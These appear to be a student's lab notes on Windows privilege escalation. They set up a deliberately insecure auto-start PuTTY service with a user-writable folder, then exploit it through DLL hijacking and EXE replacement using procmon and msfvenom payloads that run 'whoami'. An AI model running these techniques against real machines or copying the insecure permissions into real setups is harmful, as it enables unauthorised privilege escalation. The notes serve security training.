## not on CTFs but could be useful in future ##
run powershell as admin ##
net use Z: "\\https://live.sysinternals.com" /persistent:yes
#web browser http://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe
mkdir "C:\Program Files (x86)\Putty"
move C:\Users\student\Desktop\putty.exe 'C:\Program Files (x86)\Putty\putty.exe'
sc.exe create puttyService binPath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
icacls 'C:\Program Files (x86)\Putty' /grant BUILTIN\Users:W

## DLL Hyjacking
look for services that arent system made
double click and see if the file path has sn .exe in it
see if you can add a file to the directory where the .exe is 
open powershell 
cd to file path foudn in services 
open procmon add :
  process name - value: <process name>
  result- value: NAME NOT FOUND
  Path- value: <pathf rom services>
run applications see out put for vulnerable .dll
go to lin-ops create msfvenom script for payload 
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > <dll name>.dll
scp payload file into directory of vulnerable dll
execute .exe to exploit
view txt created for whoami cmd

## EXE replacement 
same steps as above till "find vuln dll"
lin-ops msfvenom 
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
run .exe and view whoami.txt 



